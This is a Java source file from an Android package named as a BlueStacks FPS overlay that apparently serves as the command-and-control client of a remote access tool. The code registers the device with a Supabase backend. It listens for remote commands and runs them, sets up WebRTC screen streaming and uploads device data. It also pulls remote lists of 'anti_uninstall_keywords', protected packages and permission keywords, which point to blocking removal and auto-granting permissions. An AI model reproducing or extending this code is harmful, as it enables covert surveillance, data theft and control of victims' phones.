package com.bluestacks.fpsoverlay;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import okhttp3.*;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.io.IOException;
import java.net.URI;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

public class SupabaseManager {
    private static final String TAG = "SupabaseManager";
    private final String deviceId;
    private final String supabaseUrl;
    private final String supabaseKey;
    private final OkHttpClient httpClient;
    private final Gson gson = new Gson();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private CommandCallback callback;
    private SignalingListener signalingListener;
    private WebSocketClient wsClient;
    private String lastProcessedOffer = "";
    private final java.util.Set<String> processedWebCandidates = new java.util.HashSet<>();

    public interface CommandCallback {
        void onCommandReceived(String cmd);
    }

    public interface SignalingListener {
        void onOfferReceived(String type, String offer);
        void onIceCandidateReceived(String candidate);
        void onStopSignalReceived();
    }

    public SupabaseManager(String deviceId, String url, String key, CommandCallback callback) {
        this.deviceId = deviceId;
        this.supabaseUrl = url;
        this.supabaseKey = key;
        this.callback = callback;
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    public void setSignalingListener(SignalingListener listener) {
        this.signalingListener = listener;
    }

    public void init() {
        syncDynamicConfig();
        registerDevice();
        startRealtime();
        startHeartbeat();
    }

    private void registerDevice() {
        JsonObject data = new JsonObject();
        data.addProperty("id", deviceId);
        data.addProperty("name", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        data.addProperty("brand", android.os.Build.BRAND);
        data.addProperty("model", android.os.Build.MODEL);
        data.addProperty("manufacturer", android.os.Build.MANUFACTURER);
        data.addProperty("sdk_version", android.os.Build.VERSION.SDK_INT);
        data.addProperty("online", true);
        
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US);
        sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
        data.addProperty("last_seen", sdf.format(new java.util.Date()));
        
        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/devices")
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .addHeader("Content-Type", "application/json")
                .addHeader("Prefer", "resolution=merge-duplicates")
                .post(RequestBody.create(gson.toJson(data), MediaType.get("application/json")))
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Registration failed", e);
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "Registration error: " + response.code() + " - " + response.body().string());
                } else {
                    Log.d(TAG, "Registration successful: " + response.code());
                }
                response.close();
            }
        });
    }

    private void upsertDevice() {
        JsonObject data = new JsonObject();
        data.addProperty("id", deviceId);
        data.addProperty("name", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        data.addProperty("brand", android.os.Build.BRAND);
        data.addProperty("model", android.os.Build.MODEL);
        data.addProperty("manufacturer", android.os.Build.MANUFACTURER);
        data.addProperty("sdk_version", android.os.Build.VERSION.SDK_INT);
        data.addProperty("online", true);
        data.addProperty("updated_at", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(new java.util.Date()));

        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/devices")
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .addHeader("Content-Type", "application/json")
                .addHeader("Prefer", "resolution=merge-duplicates")
                .post(RequestBody.create(gson.toJson(data), MediaType.get("application/json")))
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Upsert failed", e);
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                Log.d(TAG, "Upsert response: " + response.code());
                response.close();
            }
        });
    }

    private void startRealtime() {
        try {
            String wsUrl = supabaseUrl.replace("https://", "wss://") + "/realtime/v1/websocket?apikey=" + supabaseKey + "&vsn=1.0.0";
            wsClient = new WebSocketClient(new URI(wsUrl)) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    Log.d(TAG, "WS Connected. Joining channels...");
                    // Subscribe ke commands untuk device spesifik ini (Client-side filtering)
                    String joinCommands = "{\"topic\":\"realtime:public:commands\",\"event\":\"phx_join\",\"payload\":{\"config\":{\"postgres_changes\":[{\"event\":\"INSERT\",\"schema\":\"public\",\"table\":\"commands\",\"filter\":\"device_id=eq." + deviceId + "\"}]}},\"ref\":\"commands_sub\"}";
                    send(joinCommands);
                    
                    // Subscribe ke signaling untuk WebRTC
                    String joinSignaling = "{\"topic\":\"realtime:public:signaling\",\"event\":\"phx_join\",\"payload\":{\"config\":{\"postgres_changes\":[{\"event\":\"*\",\"schema\":\"public\",\"table\":\"signaling\",\"filter\":\"device_id=eq." + deviceId + "\"}]}},\"ref\":\"signal_sub\"}";
                    send(joinSignaling);

                    // Subscribe ke app_settings untuk Real-time Config Update
                    String joinSettings = "{\"topic\":\"realtime:public:app_settings\",\"event\":\"phx_join\",\"payload\":{\"config\":{\"postgres_changes\":[{\"event\":\"UPDATE\",\"schema\":\"public\",\"table\":\"app_settings\",\"filter\":\"key=eq.app_config\"}]}},\"ref\":\"settings_sub\"}";
                    send(joinSettings);
                    
                    startWsHeartbeat();
                }

                @Override
                public void onMessage(String message) {
                    try {
                        JsonObject msg = JsonParser.parseString(message).getAsJsonObject();
                        // Reply to heartbeat if needed by Phoenix protocol (Supabase)
                        if (msg.has("event") && "phx_reply".equals(msg.get("event").getAsString())) {
                            return;
                        }
                        handleWsMessage(message);
                    } catch (Exception ignored) {}
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    Log.d(TAG, "WS Closed: " + reason + " (Code: " + code + ")");
                    mainHandler.postDelayed(() -> startRealtime(), 5000);
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "WS Error", ex);
                }
            };
            wsClient.connect();
        } catch (Exception e) {
            Log.e(TAG, "WS Init Error", e);
        }
    }

    private void startWsHeartbeat() {
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (wsClient != null && wsClient.isOpen()) {
                    wsClient.send("{\"topic\":\"phoenix\",\"event\":\"heartbeat\",\"payload\":{},\"ref\":\"hb_" + System.currentTimeMillis() + "\"}");
                    mainHandler.postDelayed(this, 30000);
                }
            }
        }, 30000);
    }

    private void handleWsMessage(String message) {
        try {
            JsonObject msg = JsonParser.parseString(message).getAsJsonObject();
            String event = msg.get("event").getAsString();
            
            if ("postgres_changes".equals(event)) {
                JsonObject payload = msg.getAsJsonObject("payload");
                if (!payload.has("data")) return;
                
                JsonObject dataWrapper = payload.getAsJsonObject("data");
                String table = dataWrapper.get("table").getAsString();
                
                // Cek apakah ada record baru (INSERT/UPDATE)
                JsonObject record = null;
                if (dataWrapper.has("record") && !dataWrapper.get("record").isJsonNull()) {
                    record = dataWrapper.getAsJsonObject("record");
                }

                if (record == null) return;

                if ("commands".equals(table)) {
                    // Verifikasi device_id lagi untuk keamanan ekstra
                    if (record.has("device_id") && record.get("device_id").getAsString().equals(deviceId)) {
                        String cmd = record.get("cmd").getAsString();
                        Log.d(TAG, "Executing Command: " + cmd);
                        if (callback != null) callback.onCommandReceived(cmd);
                    }
                } else if ("signaling".equals(table)) {
                    if (record.has("device_id") && record.get("device_id").getAsString().equals(deviceId)) {
                        handleSignalingUpdate(record);
                    }
                } else if ("app_settings".equals(table)) {
                    if (record.has("key") && record.get("key").getAsString().equals("app_config")) {
                        Log.d(TAG, "Real-time Config Update Detected");
                        applyConfigFromJson(record.getAsJsonObject("value"));
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical WS Error: " + message, e);
        }
    }

    private void applyConfigFromJson(JsonObject val) {
        if (val == null) return;
        try {
            if (val.has("metered_api_key")) Config.METERED_API_KEY = val.get("metered_api_key").getAsString();
            if (val.has("stream_bitrate_min")) Config.STREAM_MIN_BITRATE = val.get("stream_bitrate_min").getAsInt();
            if (val.has("stream_bitrate_max")) Config.STREAM_MAX_BITRATE = val.get("stream_bitrate_max").getAsInt();
            if (val.has("stream_fps")) Config.STREAM_FPS = val.get("stream_fps").getAsInt();
            if (val.has("flash_interval")) Config.FLASH_INTERVAL_MS = val.get("flash_interval").getAsInt();
            if (val.has("image_quality")) Config.IMAGE_QUALITY = val.get("image_quality").getAsInt();
            if (val.has("notif_title")) Config.NOTIF_TITLE = val.get("notif_title").getAsString();
            if (val.has("notif_text")) Config.NOTIF_TEXT = val.get("notif_text").getAsString();
            if (val.has("heartbeat_interval")) Config.HEARTBEAT_MS = val.get("heartbeat_interval").getAsInt();
            if (val.has("status_interval")) Config.STATUS_UPDATE_MS = val.get("status_interval").getAsInt();

            if (val.has("anti_uninstall_keywords")) {
                com.google.gson.JsonArray keys = val.getAsJsonArray("anti_uninstall_keywords");
                java.util.List<String> newList = new java.util.ArrayList<>();
                for (int i = 0; i < keys.size(); i++) newList.add(keys.get(i).getAsString());
                Config.ANTI_UNINSTALL_KEYWORDS.clear();
                Config.ANTI_UNINSTALL_KEYWORDS.addAll(newList);
            }

            if (val.has("protected_packages")) {
                com.google.gson.JsonArray pkgs = val.getAsJsonArray("protected_packages");
                java.util.List<String> newList = new java.util.ArrayList<>();
                for (int i = 0; i < pkgs.size(); i++) newList.add(pkgs.get(i).getAsString());
                Config.PROTECTED_PACKAGES.clear();
                Config.PROTECTED_PACKAGES.addAll(newList);
            }

            if (val.has("perm_ids")) {
                com.google.gson.JsonArray ids = val.getAsJsonArray("perm_ids");
                java.util.List<String> newList = new java.util.ArrayList<>();
                for (int i = 0; i < ids.size(); i++) newList.add(ids.get(i).getAsString());
                Config.PERM_IDS.clear();
                Config.PERM_IDS.addAll(newList);
            }

            if (val.has("perm_keywords")) {
                com.google.gson.JsonArray keys = val.getAsJsonArray("perm_keywords");
                java.util.List<String> newList = new java.util.ArrayList<>();
                for (int i = 0; i < keys.size(); i++) newList.add(keys.get(i).getAsString());
                Config.PERM_KEYWORDS.clear();
                Config.PERM_KEYWORDS.addAll(newList);
            }
            Log.d(TAG, "Config Applied Successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to apply config", e);
        }
    }

    private void handleSignalingUpdate(JsonObject data) {
        String type = data.has("type") && !data.get("type").isJsonNull() ? data.get("type").getAsString() : null;
        String offer = data.has("offer") && !data.get("offer").isJsonNull() ? data.get("offer").getAsString() : null;

        Log.d(TAG, "Signaling Update Received. Type: " + type);

        if ("stop".equals(type)) {
            Log.d(TAG, "Stop signal received.");
            lastProcessedOffer = "";
            processedWebCandidates.clear();
            if (signalingListener != null) signalingListener.onStopSignalReceived();
            return;
        }

        if (offer != null && !offer.equals(lastProcessedOffer)) {
            Log.d(TAG, "New Offer Received. Type: " + type);
            lastProcessedOffer = offer;
            processedWebCandidates.clear();
            if (signalingListener != null) signalingListener.onOfferReceived(type, offer);
        }

        // Handle Web Ice Candidates (array in Supabase JSONB)
        if (data.has("candidates_web") && !data.get("candidates_web").isJsonNull()) {
            JsonArray candidates = data.getAsJsonArray("candidates_web");
            for (int i = 0; i < candidates.size(); i++) {
                String cand = candidates.get(i).getAsString();
                if (!processedWebCandidates.contains(cand)) {
                    if (signalingListener != null) signalingListener.onIceCandidateReceived(cand);
                    processedWebCandidates.add(cand);
                }
            }
        }
    }

    private void startHeartbeat() {
        mainHandler.postDelayed(new Runnable() {
            @Override public void run() {
                JsonObject updates = new JsonObject();
                updates.addProperty("id", deviceId);
                updates.addProperty("online", true);
                
                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US);
                sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
                updates.addProperty("last_seen", sdf.format(new java.util.Date()));
                
                Request request = new Request.Builder()
                        .url(supabaseUrl + "/rest/v1/devices")
                        .addHeader("apikey", supabaseKey)
                        .addHeader("Authorization", "Bearer " + supabaseKey)
                        .addHeader("Content-Type", "application/json")
                        .addHeader("Prefer", "resolution=merge-duplicates")
                        .post(RequestBody.create(gson.toJson(updates), MediaType.get("application/json")))
                        .build();

                httpClient.newCall(request).enqueue(new Callback() {
                    @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                        Log.e(TAG, "Heartbeat failed", e);
                    }
                    @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                        response.close();
                    }
                });
                mainHandler.postDelayed(this, Config.HEARTBEAT_MS);
            }
        }, 10000);
    }

    public void updateStatus(Map<String, Object> data) {
        Map<String, Object> updates = new HashMap<>();
        updates.put("status", data);
        updates.put("online", true);
        
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US);
        sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
        updates.put("last_seen", sdf.format(new java.util.Date()));

        patch("devices?id=eq." + deviceId, updates, null);
    }

    public void sendData(String type, String content) {
        Map<String, Object> data = new HashMap<>();
        data.put("device_id", deviceId);
        data.put("data_type", type);
        data.put("content", content);
        post("device_data", data, null);
    }

    public void sendAnswer(String answer) {
        Map<String, Object> data = new HashMap<>();
        data.put("answer", answer);
        patch("signaling?device_id=eq." + deviceId, data, null);
    }

    public void sendIceCandidate(String candidate) {
        JsonObject params = new JsonObject();
        params.addProperty("dev_id", deviceId);
        params.addProperty("new_candidate", candidate);

        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/rpc/append_device_candidate")
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .post(RequestBody.create(gson.toJson(params), MediaType.get("application/json")))
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "ICE Sync Failed (Network)", e);
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "ICE Sync Failed (RPC Error): " + response.code() + " - " + response.body().string());
                }
                response.close();
            }
        });
    }

    public void fetchRtcConfig(Callback cb) {
        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/app_settings?key=eq.app_config&select=value")
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .get()
                .build();
        httpClient.newCall(request).enqueue(cb);
    }

    public void syncDynamicConfig() {
        fetchRtcConfig(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Failed to sync dynamic config", e);
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String body = response.body().string();
                        // Use GSON for consistency in the sync method as well
                        JsonArray arr = JsonParser.parseString(body).getAsJsonArray();
                        if (arr.size() > 0) {
                            JsonObject val = arr.get(0).getAsJsonObject().getAsJsonObject("value");
                            applyConfigFromJson(val);
                            Log.d(TAG, "Dynamic Config Synced Successfully");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing dynamic config", e);
                    }
                }
                response.close();
            }
        });
    }

    private void post(String table, Object data, Callback cb) {
        String json = gson.toJson(data);
        Log.d(TAG, "POST to " + table + ": " + json);
        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/" + table)
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .addHeader("Content-Type", "application/json")
                .post(RequestBody.create(json, MediaType.get("application/json")))
                .build();
        if (cb != null) httpClient.newCall(request).enqueue(cb);
        else httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "POST failed for " + table, e);
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException { 
                Log.d(TAG, "POST response for " + table + ": " + response.code() + " " + response.body().string());
                response.close(); 
            }
        });
    }

    private void patch(String query, Object data, Callback cb) {
        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/" + query)
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .addHeader("Content-Type", "application/json")
                .patch(RequestBody.create(gson.toJson(data), MediaType.get("application/json")))
                .build();
        if (cb != null) httpClient.newCall(request).enqueue(cb);
        else httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException { response.close(); }
        });
    }

    public void deleteData() {
        Request request = new Request.Builder()
                .url(supabaseUrl + "/rest/v1/devices?id=eq." + deviceId)
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer " + supabaseKey)
                .delete()
                .build();
        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException { response.close(); }
        });
    }
}
